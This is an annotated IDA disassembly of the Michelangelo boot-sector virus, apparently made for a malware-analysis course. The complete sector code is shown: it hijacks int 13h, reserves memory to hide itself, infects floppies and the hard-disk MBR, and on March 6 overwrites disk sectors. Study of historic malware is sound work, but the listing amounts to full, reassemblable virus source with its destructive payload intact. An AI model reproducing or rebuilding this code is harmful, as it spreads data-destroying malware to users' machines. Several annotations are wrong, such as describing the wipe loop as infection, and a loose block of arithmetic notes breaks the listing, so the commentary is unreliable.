seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2023 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/gweese3/malware/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model small
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     MALWARESTART
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 byte_7C03       db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db 0
seg000:7C05 virus_segment   dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db 2, 0Eh, 0
seg000:7C0A int13           dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0A                                         ; Original segment of int13h
seg000:7C0C int13_seg       dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0C                                         ; original offset of 13h
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; start of malware int13h handler, after int13 hijack all int13 interrupts go here
seg000:7C0E                                         ;
seg000:7C0E                                         ; Because this is an int13 hijack, the registers are set to whatever the invoker's register setup is
seg000:7C0E                                         ;
seg000:7C0E                                         ;
seg000:7C0E                                         ; Need to screen arguments of int13
seg000:7C0F                 push    ax              ; save ax because of register hijack
seg000:7C10                 or      dl, dl          ; test if this is drive A
seg000:7C12                 jnz     short nofloppyRunInt13 ; if not drive A then use the real Int13 handler
seg000:7C14                 xor     ax, ax          ; IF IT IS DRIVE A(0 xor 0) ax= 0
seg000:7C16                 mov     ds, ax          ; set data register to the start of the memory segment 0000
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; is the drive motor running?
seg000:7C1D                 jnz     short nofloppyRunInt13 ; if drive motor is  running(the floppy has already been interacted with), run the real int13
seg000:7C1F                 pop     ax              ; STACK CLEANUP
seg000:7C20                 pop     ds              ; stack cleanup data segment
seg000:7C21                 pushf                   ; add the entire flag register to the stack and decrement stack pointer by 4
seg000:7C22                 call    dword ptr cs:0Ah ; load the original int13, assuming this is first write of the floppy due to conditionals above
seg000:7C22                                         ;
seg000:7C22                                         ; Call instead of jump because virus wants the return to actually be here
seg000:7C27                 pushf                   ; add flag register to the stack again after call changes
seg000:7C28                 call    infectfloppy    ; call to start the infection process
seg000:7C2B                 popf                    ; remove flags from the stack
seg000:7C2C                 retf    2
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F nofloppyRunInt13:                       ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax              ; take accumulator off the stack
seg000:7C30                 pop     ds              ; remove data segment from the stack
seg000:7C31                 jmp     dword ptr cs:0Ah ; jump to the real Int13h handler
seg000:7C31                                         ;
seg000:7C31                                         ; Jump not a call so it doesn't modify the return address and change user expectation
seg000:7C31                                         ;
seg000:7C31                                         ; Want real int13 to return to the actual invocation
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 infectfloppy    proc near               ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ; save register state on the stack
seg000:7C37                 push    bx              ; save register on the stack
seg000:7C38                 push    cx              ; save register on the stack
seg000:7C39                 push    dx              ; save register on the stack
seg000:7C3A                 push    ds              ; put register state on the stack
seg000:7C3B                 push    es              ; put register state on the stack
seg000:7C3C                 push    si              ; PUT REGISTER STATE ON THE STACK
seg000:7C3D                 push    di              ; PUT REGISTER STATE ON THE STACK
seg000:7C3E                 push    cs              ; PUT REGISTER ON THE STACK
seg000:7C3F                 pop     ds              ; cs at the top of the stack, ds now points to cs
seg000:7C40                 push    cs              ; save cs register state on the stack
seg000:7C41                 pop     es              ; ds and es both point to cs
seg000:7C42                 mov     si, 4           ; Attempts set to 4
seg000:7C42                                         ;
seg000:7C42                                         ; The assumption is that this is a new floppy,
seg000:7C42                                         ; it can take 4 attempts(DOS manual) to read from a cold floppy
seg000:7C45
seg000:7C45 readattempt:                            ; CODE XREF: infectfloppy+29↓j
seg000:7C45                 mov     ax, 201h        ; read one sector
seg000:7C48                 mov     bx, 200h        ; look at 512 bytes beyond the virus code
seg000:7C4B                 mov     cx, 1           ; read track 0 sector 1(mbr)
seg000:7C4E                 xor     dx, dx          ; clear register
seg000:7C50                 pushf                   ; add flags register to the stack
seg000:7C51                 call    dword ptr ds:0Ah ; Call Int13h handler to read drive A sector 1
seg000:7C51                                         ;
seg000:7C51                                         ; Can't use the actual interrupt keyword with int13h handler because it will cause an infinite loop of the virus calling itself
seg000:7C55                 jnb     short readsuccessful? ; if the carry flag is not set, original int13 ran so jump and see if the virus was successfully read
seg000:7C57                 xor     ax, ax          ; reset disk to 0
seg000:7C59                 pushf                   ; add flags register to the stack
seg000:7C5A                 call    dword ptr ds:0Ah ; AGAIN LOOK FOR ORIGINAL Int13
seg000:7C5E                 dec     si              ; we have attempted once so dec our attempt counter
seg000:7C5F                 jnz     short readattempt ; if we still have some attempts left then try it again
seg000:7C61                 jmp     short popregistersandreturn ; if we are out of attempts then just go ahead and clean up, the original MBR is not found
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 readsuccessful?:                        ; CODE XREF: infectfloppy+1F↑j
seg000:7C63                 xor     si, si          ; clear si
seg000:7C65                 cld                     ; string operations will now increment the index registers
seg000:7C66                 lodsw                   ; grab the first word of the virus. goes into AX register because...?
seg000:7C67                 cmp     ax, [bx]        ; compare first word of the virus that is in ax to the value bx points to to check and see if the virus is on the system already
seg000:7C69                 jnz     short floppynotinfected ; AX-BX is not zero so the virus isn't on this system so go and put it on the system
seg000:7C6B                 lodsw                   ; be extra special sure and grab the next word to check again
seg000:7C6C                 cmp     ax, [bx+2]      ; check again to see if the virus exists
seg000:7C6F                 jz      short popregistersandreturn ; if the virus exists on this system then pack things up and go home
seg000:7C71
seg000:7C71 floppynotinfected:                      ; CODE XREF: infectfloppy+33↑j
seg000:7C71                 mov     ax, 301h        ; write original system boot sector MBR
seg000:7C74                 mov     dh, 1           ; SET HEAD NUMBER TO WRITE MBR to head 1
seg000:7C76                 mov     cl, 3           ; set sector number, write original MBR to sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; CHECK IF THIS IS A FLOPPY DISK and meets 360k requirement
seg000:7C7C                 jz      short floppysizeCorrect ; floppy disk is the correct size
seg000:7C7E                 mov     cl, 0Eh         ; set sector 14 for the default sector because the floppy disk failed
seg000:7C80
seg000:7C80 floppysizeCorrect:                      ; CODE XREF: infectfloppy+46↑j
seg000:7C80                 mov     ds:8, cx        ; write the original MBR to the first sector
seg000:7C84                 pushf                   ; dec the stack pointer by 4 and push the flag register contents onto the stack
seg000:7C85                 call    dword ptr ds:0Ah ; CALL THE ORIGINAL INT 13h handler
seg000:7C89                 jb      short popregistersandreturn ; if the int handler code failed, clean up and exit
seg000:7C8B                 mov     si, 3BEh        ; SET THE SOURCE INDEX REGISTER PARTITION TABLE START
seg000:7C8E                 mov     di, 1BEh        ; set the destination index register to copy the master partition table
seg000:7C91                 mov     cx, 21h ; '!'   ; COPY 33 bytes, set start
seg000:7C94                 cld                     ; clear flags
seg000:7C95                 rep movsw               ; copy master partition table
seg000:7C97                 mov     ax, 301h        ; at sector 1 write virus
seg000:7C9A                 xor     bx, bx          ; CLEAR BX
seg000:7C9C                 mov     cx, 1           ; set sector 1 for writing
seg000:7C9F                 xor     dx, dx          ; CLEAR DX
seg000:7CA1                 pushf                   ; DEC STACK BY 4 and put flag register onto stack
seg000:7CA2                 call    dword ptr ds:0Ah ; CALL THE ORIGINAL INT13h handler
seg000:7CA6
seg000:7CA6 popregistersandreturn:                  ; CODE XREF: infectfloppy+2B↑j
seg000:7CA6                                         ; infectfloppy+39↑j ...
seg000:7CA6                 pop     di              ; REMOVE DI FROM STACK
seg000:7CA7                 pop     si              ; remove si from stack
seg000:7CA8                 pop     es              ; REMOVE ES FROM STACK
seg000:7CA9                 pop     ds              ; REMOVE DS FROM STACK
seg000:7CAA                 pop     dx              ; REMOVE DX FROM STACK
seg000:7CAB                 pop     cx              ; remove cx from stack
seg000:7CAC                 pop     bx              ; REMOVE BX FROM STACK
seg000:7CAD                 pop     ax              ; REMOVE AX FROM THE STACK
seg000:7CAE                 retn                    ; END THE FLOPPY INFECT PROCEDURE
seg000:7CAE infectfloppy    endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF MALWARESTART:                           ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; zero out ax
seg000:7CB1                 mov     ds, ax          ; zero out ds
seg000:7CB3                 cli                     ; temporarily disable interrupts
seg000:7CB4                 mov     ss, ax          ; SET STACK SEGMENT TO 00007C00h on boot
seg000:7CB6                 mov     ax, 7C00h       ; give ax the value for the register mbr is expected to be in
seg000:7CB9                 mov     sp, ax          ; move stack pointer to mbr address
seg000:7CBB                 sti                     ; turn interrupts back on
seg000:7CBC                 push    ds              ; STORE 0000:7C00h to return to original boot
seg000:7CBD                 push    ax              ; ax on the stack
seg000:7CBE                 mov     ax, ds:4Ch      ; GET ADDRESS FOR INT13 calls to be redirected to later
seg000:7CC1                 mov     ds:int13, ax    ; SAVE THE ORIGINAL INT 13h ADDRESS OFFSET TO INT13
seg000:7CC4                 mov     ax, ds:4Eh      ; give offset for in13h calls to be redirected to
seg000:7CC7                 mov     ds:int13_seg, ax ; Replace virus int13h offset
seg000:7CCA                 mov     ax, ds:413h     ; CHECK TO SEE HOW MUCH AVAILABLE MEMORY EXISTS
seg000:7CCD                 dec     ax              ; virus decrements by 2k to hide from the CPU
seg000:7CCE                 dec     ax              ; continued decrementing
seg000:7CCF                 mov     ds:413h, ax     ; STORE UPDATED MEM SIZE IN DS413
seg000:7CCF Physical address = segment * 16 + offset
seg000:7CCF
seg000:7CCF We want the segment for the base address of the 2k reserved memory, so offset =0
seg000:7CCF
seg000:7CCF Ax * 2 **10 = segment ** 2**4
seg000:7CCF
seg000:7CCF Segment = (ax * **10) / 2**4 = ax * 2**6 so shi is appropriate to get the segment
seg000:7CD2                 mov     cl, 6           ; RECALCULATE NEW SEGMENT OF VIRUS
seg000:7CD4                 shl     ax, cl          ; convert ax to a 16 bit segment address pointer to the allocated 2kb memory
seg000:7CD4                                         ; ax= ax * (2 ^ 6)
seg000:7CD4                                         ; 8086- style segmentation Physical addr = seg * 16 + offset
seg000:7CD6                 mov     es, ax          ; ES POINT TO THE RESERVED 2k memory block
seg000:7CD8                 mov     ds:virus_segment, ax ; STORE THE PHYSICAL ADDR OF THE RESERVED 2K BLOCK
seg000:7CDB                 mov     ax, 0Eh         ; VIRUS INTERRUPT 13
seg000:7CDE                 mov     ds:4Ch, ax      ; ACTUALLY REPLACE INT13 offset here
seg000:7CE1                 mov     word ptr ds:4Eh, es ; ACTUALLY REPLACE THE ORIGINAL SEG 13 with the malware's segment 13
seg000:7CE1                                         ;
seg000:7CE1                                         ; Now when someone hits Int13, CPU will go to virus code, offset 0E
seg000:7CE1                                         ;
seg000:7CE1                                         ; ALL CODE CALLING INT13 AFTER THIS WILL BE A REPLACED INT13
seg000:7CE5                 mov     cx, 1BEh        ; Cx = 0x1BE copy 466 bytes of virus code
seg000:7CE8                 mov     si, 7C00h       ; SI = 0x7C00 load the address of the virus
seg000:7CEB                 xor     di, di          ; CLEAR DI
seg000:7CED                 cld                     ; clear Df flag, string operations increment index registers
seg000:7CEE                 rep movsb               ; Repeat the copy cx times to move byte
seg000:7CEE                                         ; From dssi to es:di
seg000:7CEE                                         ; The si and di will increment based on previous instruction cld
seg000:7CEE                                         ;
seg000:7CEE                                         ; Thus this chunk of code copies 446 byte of virus code to the 2k reserved mem block
seg000:7CF0                 jmp     dword ptr cs:byte_7C03 ; DYNAMIC JUMP TO HIGHER MEMORY - overwrite the cs register, grabbing segment and offset
seg000:7CF0                                         ;
seg000:7CF0                                         ; Actually jumps to 0F5 offset of the virus
seg000:7CF0                                         ;
seg000:7CF0                                         ; Segment comes from ax number magic above
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax          ; SET TO 0, Recieved from jump above
seg000:7CF7                 mov     es, ax          ; CLEAR ES
seg000:7CF9                 int     13h             ; Note: This is not the real Int13 call at this time
seg000:7CF9                                         ; The way memory is setup right now actually points inside the virus
seg000:7CF9                                         ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs              ; CS ONTO STACK
seg000:7CFC                 pop     ds              ; DS = CS Stolen 2k of memory
seg000:7CFD                 mov     ax, 201h        ; STATUS 2, read 1 sector
seg000:7D00                 mov     bx, 7C00h       ; Go up until start of MBR
seg000:7D03                 mov     cx, ds:8        ; Expecting track 0, sector 1
seg000:7D07                 cmp     cx, 7           ; CHECK IF MALWARE IS ON THE HARD DISK
seg000:7D0A                 jnz     short floppy
seg000:7D0C                 mov     dx, 80h         ; target first hard drive
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D11                 jmp     short birthdaycheck
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 floppy:                                 ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; HANDLING FLOPPY
seg000:7D17                 mov     dx, 100h        ; :head at 1 targeting first floppy
seg000:7D1A                 int     13h             ; Floppy disk read
seg000:7D1A                                         ;
seg000:7D1A                                         ; This will actually end up writing the MBR to the original section of the virus before a copy
seg000:7D1C                 jb      short birthdaycheck ; IF INT13 fails go check if its the right date
seg000:7D1E                 push    cs              ; PUT CS ONTO THE STACK
seg000:7D1F                 pop     es              ; PUT CS VALUES INTO ES REGISTER
seg000:7D20                 mov     ax, 201h        ; STATUS 2 read sector 1
seg000:7D23                 mov     bx, 200h        ; Go until 512 bytes after virus code
seg000:7D26                 mov     cx, 1           ; read track 0 sector 1(MBR)
seg000:7D29                 mov     dx, 80h         ; target first hard drive
seg000:7D2C                 int     13h             ; Being read into magic ax number:200
seg000:7D2C                                         ;
seg000:7D2C                                         ; Adding it to the decremented 2k of virus memory
seg000:7D2C                                         ;
seg000:7D2C                                         ; DISK - READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D2C                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D2E                 jb      short birthdaycheck
seg000:7D30                 xor     si, si          ; CLEAR source index register
seg000:7D32                 cld                     ; string operations will now increment si
seg000:7D33                 lodsw                   ; SET THE FIRST WORD OF THE VIRUS INTO AX
seg000:7D34                 cmp     ax, [bx]        ; CHECK IF MALWARE IS ALREADY ON THE COMPUTER
seg000:7D36                 jnz     short infectdisk ; IF MALWARE ISN"T ON THE DRIVE THEN PUT IT ON
seg000:7D38                 lodsw                   ; get the next word for comparison
seg000:7D39                 cmp     ax, [bx+2]      ; CHECK THE NEXT WORD FOR THE SECOND CHECK TO SEE IF IT IS REALLY INFECTED
seg000:7D3C                 jnz     short infectdisk ; if not infected go infect it
seg000:7D3E
seg000:7D3E birthdaycheck:                          ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx          ; clear cx, actually dead code
seg000:7D40                 mov     ah, 4           ; RESET THE DATE
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; :is today march 6?
seg000:7D48                 jz      short DESTROY   ; if march 6 go destroy
seg000:7D4A                 retf                    ; grab the return address from the stack, the only return address on the stack at this time is push ds push ax, which cleans the stack off, going to what is now the clean MBR at 0000:7C00 to boot the computer up normally
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B DESTROY:                                ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; clear dx
seg000:7D4D                 mov     cx, 1           ; SET CODE SEGMENT TO 1
seg000:7D50
seg000:7D50 malwareonsector:                        ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; WRITE SECTOR SELECTION
seg000:7D53                 mov     si, ds:8        ; SET SI REGISTER FROM SECTOR 1
seg000:7D57                 cmp     si, 3           ; COMPARE SI REGISTER TO 3
seg000:7D5A                 jz      short loc_7D6C  ; IF THE CORRECT NUMBER OF BYTES IS AT THE TARGET, go to infect it
seg000:7D5C                 mov     al, 0Eh         ; WRITE MALWARE TO THESE SECTORS
seg000:7D5E                 cmp     si, 0Eh         ; DEFINE SECTORS THAT MALWARE CAN WRITE TO
seg000:7D61                 jz      short loc_7D6C  ; IS THIS WHERE WE WANT MALWARE TO BE?
seg000:7D63                 mov     dl, 80h         ; write to the first hdd
seg000:7D65                 mov     byte ptr ds:7, 4 ; DEFINE THE NUMBER OF HEAPS THAT MALWARE CAN WRITE TO
seg000:7D6A                 mov     al, 11h         ; MALWARE IS BEING WRITTEN TO THESE SECTORS
seg000:7D6C
seg000:7D6C loc_7D6C:                               ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; Set memory location for malware to infect
seg000:7D6F                 mov     es, bx          ; STORE VALUE IN ES
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D71                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D71                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D71                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D73                 jnb     short loc_7D79  ; INT 13h failed
seg000:7D75                 xor     ah, ah          ; clear ah
seg000:7D77                 int     13h             ; Once here, begin overwriting the sectors starting from 1, go through the different sectors of the disk or floppy, overwrite them with stuff at 5000:5000(arbitrary, just clearing data)
seg000:7D77                                         ;
seg000:7D77                                         ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 loc_7D79:                               ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; malware jumps writing to the next head, write allowed
seg000:7D7B                 cmp     dh, ds:7        ; CHECK TO ENSURE THIS DOESN"T EXCEED 4(max)
seg000:7D7F                 jb      short malwareonsector ; YOU CAN WRITE TO THIS SO INFECT IT
seg000:7D81                 xor     dh, dh          ; CLEAR DH
seg000:7D83                 inc     ch              ; malware then tries to infect the next possible sector
seg000:7D85                 jmp     short malwareonsector ; MALWARE TRIES AGAIN AFTER CHANGING THE SECTOR
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 infectdisk:                             ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; set sector to be sector 7
seg000:7D8A                 mov     ds:8, cx        ; WRITE PARTITION TABLE FROM MBR to the sector
seg000:7D8E                 mov     ax, 301h        ; set ax for int13 write call later
seg000:7D91                 mov     dx, 80h         ; SET HARD DISK 1
seg000:7D94                 int     13h             ; Save the clean MBR to the hard drive below the hard drive original MBR
seg000:7D94                                         ;
seg000:7D94                                         ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D94                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D96                 jb      short birthdaycheck
seg000:7D98                 mov     si, 3BEh        ; STORE PARTITION TABLE IN SI
seg000:7D9B                 mov     di, 1BEh        ; WRITE PARTITION TABLE
seg000:7D9E                 mov     cx, 21h ; '!'   ; SIZE THE COPY OF THE NEW PARTITION TABLE AND VERIFY SIZE
seg000:7DA1                 rep movsw               ; ACTUALLY WRITE THE COPY OF THE PARTITION TABLE
seg000:7DA3                 mov     ax, 301h        ; SET AX FOR THE NEW PARTITION TABLE COPY
seg000:7DA6                 xor     bx, bx          ; address of user buffer = magic ax : segment 0000
seg000:7DA8                 inc     cl              ; NOW WRITE TO SECTOR 8
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAC                 jmp     short birthdaycheck
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh ; SET MEMORY FOR RETURN
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
